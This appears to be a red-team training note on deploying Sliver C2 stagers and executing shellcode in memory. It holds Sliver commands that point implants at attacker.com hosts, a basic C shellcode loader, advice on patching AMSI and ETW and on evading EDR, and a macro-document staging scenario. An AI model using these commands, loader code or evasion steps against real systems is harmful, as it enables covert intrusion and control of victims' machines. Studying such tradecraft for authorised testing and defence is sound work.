---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.06 Sliver Stagers and Shellcode Execution"
---

# 95.06 Sliver Stagers and Shellcode Execution

## Introduction

Sliver is an advanced open-source Command and Control (C2) framework built by BishopFox. In many high-maturity environments, dropping a fully compiled, statically linked 10MB+ Golang payload directly onto disk is a surefire way to get caught by modern Endpoint Detection and Response (EDR) solutions. To circumvent this, Red Teams utilize **Stagers** and **Shellcode Execution**.

A stager is a lightweight payload whose sole responsibility is to reach out to the C2 server, retrieve the full payload (the "stage" or "implant"), load it into memory, and execute it. This architecture minimizes the footprint of the initial delivery mechanism and avoids writing the large, easily signatured Sliver binary to disk.

This module details the generation, deployment, and operational security (OPSEC) considerations of using Sliver stagers and raw shellcode formats.

## Architecture and Flow Diagram

Below is an ASCII representation of the staging and shellcode execution process within Sliver.

```text
    [ Target System ]                                          [ Sliver C2 Server ]
                                                                       |
+--------------------------+                                           |
| 1. Initial Access Vector |                                           |
|    (e.g., Phishing,      |                                           |
|     Exploitation)        |                                           |
+--------------------------+                                           |
            |                                                          |
            v                                                          |
+--------------------------+                                           |
| 2. Stager Execution      | -- (a) Reaches out via HTTP/HTTPS/MTLS -->|
|    (Lightweight payload, |                                           |
|     < 10KB size)         |                                           |
+--------------------------+                                           |
            |                                                          |
            | <--------- (b) Returns Full Implant (Shellcode) ---------|
            v                                                          |
+--------------------------+                                           |
| 3. Memory Allocation     |                                           |
|    (VirtualAlloc,        |                                           |
|     NtAllocateVirtualMem)|                                           |
+--------------------------+                                           |
            |                                                          |
            v                                                          |
+--------------------------+                                           |
| 4. Shellcode Injection   |                                           |
|    (Self-Injection or    |                                           |
|     Process Injection)   |                                           |
+--------------------------+                                           |
            |                                                          |
            v                                                          |
+--------------------------+                                           |
| 5. Execution (Thread)    | -- (c) C2 Callback established (MTLS/WG)->|
|    (CreateThread)        |                                           |
+--------------------------+                                           |
```

## Generating Stagers

Sliver provides native support for generating various types of stagers, primarily utilizing the `generate stager` command. Sliver stagers work closely with profiles, which define the configuration of the implant that will be staged.

### Step 1: Create an Implant Profile
Profiles store configuration details without generating the binary immediately.
```bash
sliver > profiles new --mtls c2.attacker.com:8888 --format shellcode --arch amd64 my_mtls_profile

[*] Saved new profile 'my_mtls_profile'
```

### Step 2: Create a Staging Listener
The listener must be configured to host the stage. You specify the profile that will be served when the stager calls back.
```bash
sliver > stage-listener --url http://192.168.1.100:8080 --profile my_mtls_profile

[*] Starting staging listener on http://192.168.1.100:8080
[*] Profile 'my_mtls_profile' is linked to this listener
```

### Step 3: Generate the Stager
Now, generate the actual stager payload that will connect to the `stage-listener`.
```bash
sliver > generate stager --lhost 192.168.1.100 --lport 8080 --arch amd64 --format shellcode

[*] Generating stager...
[*] Stager written to /tmp/stager.bin
```

## Shellcode Execution Strategies

Once you have generated the shellcode (either the stager shellcode or a full shellcode implant), the next challenge is executing it securely in memory.

### 1. Local Process Injection (Self-Injection)
The simplest execution method is to have a custom loader allocate memory in its own process and execute it. 
While conceptually simple, this method requires the loader itself to evade detection.
Common APIs used:
- `VirtualAlloc` / `VirtualAllocEx`
- `RtlMoveMemory`
- `CreateThread` / `EnumTimeFormatsA` (for callback execution)

```c
// Example snippet of a basic local shellcode loader
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = { /* Shellcode bytes */ };

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```
*Note: Using `PAGE_EXECUTE_READWRITE` (RWX) is a major IOC. Modern OPSEC dictates allocating as `PAGE_READWRITE` (RW), copying the shellcode, and then changing protections to `PAGE_EXECUTE_READ` (RX) via `VirtualProtect`.*

### 2. Remote Process Injection
Injecting into a remote, legitimate process (e.g., `explorer.exe` or `svchost.exe`) helps hide the implant execution context. 
Techniques include:
- APC Queue Code Injection
- Process Hollowing
- Thread Execution Hijacking

## OPSEC Considerations

When dealing with stagers and shellcode execution, defensive mechanisms like AMSI, ETW, and API Hooking by EDRs are primary concerns.

1. **AMSI & ETW Patching:** Ensure your loader disables or bypasses Anti-Malware Scan Interface and Event Tracing for Windows prior to staging. If the stager downloads the full Sliver shellcode and loads it into memory without these protections, memory scanners might detect the Golang signatures.
2. **Encryption:** Never stage raw plaintext shellcode over HTTP. Use HTTPS/MTLS listeners or implement a custom loader that decrypts the downloaded payload locally using AES or XOR.
3. **Entropy:** High entropy in loader executables often flags heuristic scanners. Store shellcode in encrypted resources, obfuscate it, or dynamically decode it.
4. **Sleep Obfuscation:** Sliver natively supports sleep obfuscation (via Ekko or similar mechanisms), which encrypts the memory regions of the implant while it is sleeping, bypassing memory scanners.

## Real-World Attack Scenario

### Initial Compromise via Malicious Document
During an adversary simulation for a financial institution, the Red Team gains initial execution via a macro-enabled Excel document. Because the EDR heavily monitors child processes of Office applications, dropping a full Sliver binary is impossible.

### Staging Execution
1. The VBA macro drops a small, obfuscated C# loader to disk (or compiles it dynamically via `csc.exe`).
2. The loader executes and performs ETW patching to blind the EDR's telemetry in that specific process.
3. The loader allocates RW memory, reaches out to `https://cdn.attacker.com/favicon.ico` (which is actually the Sliver stager listener), and downloads the AES-encrypted shellcode.
4. The loader decrypts the shellcode, changes memory permissions to RX, and creates a thread using indirect syscalls to avoid API hooks.
5. The Sliver implant initializes completely in memory, bypassing disk-based AV, and establishes an MTLS connection back to the C2 infrastructure.
6. The Red Team now has a fully functioning Sliver session with zero disk footprint for the main binary.

## Chaining Opportunities

- **Obfuscation Chains:** Chain the shellcode generated here with tools like `Donut` or `sRDI` to convert DLLs to shellcode.
- **Loader Frameworks:** Integrate Sliver shellcode into loaders like `ScareCrow` or `Inceptor` to automate the EDR bypass techniques mentioned in the OPSEC section.
- **Evasion Tactics:** Combine shellcode execution with the evasion features discussed in [[08 - Evasion Techniques in Sliver Process Hollowing BlockDLLs]].

## Related Notes

- [[02 - Sliver C2 Architecture and Listener Types]]
- [[04 - Generating and Obfuscating Sliver Implants]]
- [[07 - Sliver Armory Installing Custom Extensions]]
- [[08 - Evasion Techniques in Sliver Process Hollowing BlockDLLs]]
- [[10 - Integrating BOFs Beacon Object Files in Sliver]]
